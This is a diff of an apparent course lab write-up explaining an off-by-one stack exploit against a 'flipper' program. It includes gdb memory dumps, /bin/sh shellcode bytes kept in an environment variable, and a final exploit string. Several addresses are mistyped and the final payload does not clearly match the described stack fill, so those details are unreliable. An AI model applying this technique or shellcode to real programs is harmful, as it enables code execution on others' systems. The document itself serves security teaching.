@@ -2,49 +2,85 @@
 
 ## Main Idea
 
-The code is vulnerable because `gets(buf)` does not check the length of the input from the user. So we can inject the SHELLCODE right after the return address, and overwrite the return address with the address of the shellcode.  
+The code is vulnerable the boardary check in flip in off by one, It should be less than 64, however, the boardary check in code is less and equal than 64. This can lead to a off-by-one attack.
 
-## Magic Numbers
+There is a clever methods to bypass the check of RIP. At first, we use the address of shellcode to fill in all the buffer. And then use the off-by-one attack to overwrite the SFP. At second, the function will return rightly, but the SFP is tampered. Next, the tampered SFP will impact RIP of function in the next call. Since the whole buffer is filled with address of shellcode, we will return to the SHELLCODE.
 
-The address of buffer is `0xffffd698`, the RIP is `0xffffd6ac`, so the location of RIP is 20 bytes away from the start of the buffer (0xffffd6ac - 0xffffd698).
+Don't forget to flip the output of args according to the `flipper.c`.
 
-``` C++
-(gdb) x/16x buf
-0xffffd698:  0x00000000   0x00000000   0x00000000   0x00000000
-0xffffd6a8:  0xffffd6b8   0x08049208   0x00000001   0x080491fd   
-0xffffd6b8:  0xffffd73c   0x080493d6   0x00000001   0xffffd734   
-0xffffd6c8:  0xffffd73c   0x0804a000   0x00000000   0x00000000
-(gdb) i f
-Stack level 0, frame at 0xffffd6b0:
- eip = 0x80491eb in orbit (orbit.c:5); saved eip = 0x8049208
- called by frame at 0xffffd6c0
- source language c.
- Arglist at 0xffffd6a8, args:
- Locals at 0xffffd6a8, Previous frame's sp is 0xffffd6b0
- Saved registers:
-  ebp at 0xffffd6a8, eip at 0xffffd6ac
+## address of shellcode
+
+Firstly, we need to find the location of SHELLCODE (), which is in the environment variable. So we know the shellcode begins with `0xcd58326a`, thus the magic number is `0xffffdf9c`
+
+``` c++
+(gdb) p environ[0]
+$1 = 0xffffd801 "SHLVL=1"
+(gdb) p environ[1]
+$2 = 0xffffd809 "PAD=", '\377' <repeats 196 times>...
+(gdb) p environ[2]
+$3 = 0xffffdf7e "TERM=screen"
+(gdb) p environ[3]
+$4 = 0xffffdf8a "SHELL=/bin/sh"
+(gdb) p environ[4]
+$5 = 0xffffdf98 "EGG=j2X̀\211É\301jGX̀1\300Ph-iii\211\342Ph+mmm\211\341Ph//shh/b
+in\211\343PRQS\211\341\061Ұ\v̀"
+(gdb) x/16x environ[4]
+0xffffdf98:     0x3d474745      0xcd58326a      0x89c38980      0x58476ac1
+0xffffdfa8:     0xc03180cd      0x692d6850      0xe2896969      0x6d2b6850      
+0xffffdfb8:     0xe1896d6d      0x2f2f6850      0x2f686873      0x896e6962      
+0xffffdfc8:     0x515250e3      0x31e18953      0xcd0bb0d2      0x57500080 
 ```
 
-## Exploit Structure
+## address of return address (RIP)
 
-Here is the stack diagram.
+We can get RIP by `info frame`, which is `0xfffd614`
+(gdb) i f
 
-The exploit has three parts:
+``` c++
+Stack level 0, frame at 0xffffd618:
+ eip = 0x8049260 in invoke (flipper.c:20); saved eip = 0x804927a
+ called by frame at 0xffffd608
+ source language c.
+ Arglist at 0xffffd610, args:
+    in=0xffffd7bf "\274\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337߼\377\337\337 "
+ Locals at 0xffffd610, Previous frame's sp is 0xffffd618
+ Saved registers:
+  ebp at 0xffffd610, eip at 0xffffd614
+```
 
-1. Write 20 dummy characters to overwrite `buf`, the compiler padding, and the sfp.
-2. Overwrite the rip with the address of the shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with `0xffffd6b0` (`0xffffd6ac + 4`).
-3. Finally, insert the shellcode directly after the rip.
+## address of buf
 
-This causes the `orbit` function to start executing the shellcode at address `0xffffd6b0` when it returns.
-
-## Exploit GDB Output
-
-When we ran GDB after inputting the malicious exploit string, we got the following output:
+We can get the address of buf by `print &buf`, which is `0xffffd5d0`
 
 ```C++
-(gdb) x/16x buf
-0xffffd698:  0x41414141   0x41414141   0x41414141   0x41414141
-0xffffd6a8:  0x41414141   0xffffd6b0   0xcd58326a   0x89c38980
-0xffffd6b8:  0x58476ac1   0xc03180cd   0x692d6850   0xe2896969
-0xffffd6c8:  0x6d2b6850   0xe1896d6d   0x2f2f6850   0x2f686873
+(gdb) p &buf
+$6 = (char (*)[64]) 0xffffd5d0
 ```
+
+## the stack before attack
+
+```c++
+(gdb) x/20x buf
+0xffffd5d0:     0x00000000      0x00000001      0x00000000      0xffffd78b
+0xffffd5e0:     0x00000002      0x00000000      0x00000000      0x00000000
+0xffffd5f0:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
+0xffffd600:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffd610:     0xffffd61c      0x0804927a      0xffffd7bf      0xffffd628
+```
+
+## the stack after attack
+
+note that the SFP is tampered to 0xfffd600, the new RIP will be the SFP + 4 = 0xfffd604
+
+```C++
+(gdb) x/20x buf
+0xffffd5d0:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
+0xffffd5e0:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
+0xffffd5f0:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
+0xffffd600:     0xffffdf9c      0xffffdf9c      0xffffdf9c      0xffffdf9c
+0xffffd610:     0xffffd600      0x0804927a      0xffffd7bf      0xffffd628
+```
+
+## EGG output
+
+thus the output of arg will be  `52 * "A" + "\x9c\xdf\xff\xff" + 8 * "A" + "\x00"` xor `\x20`
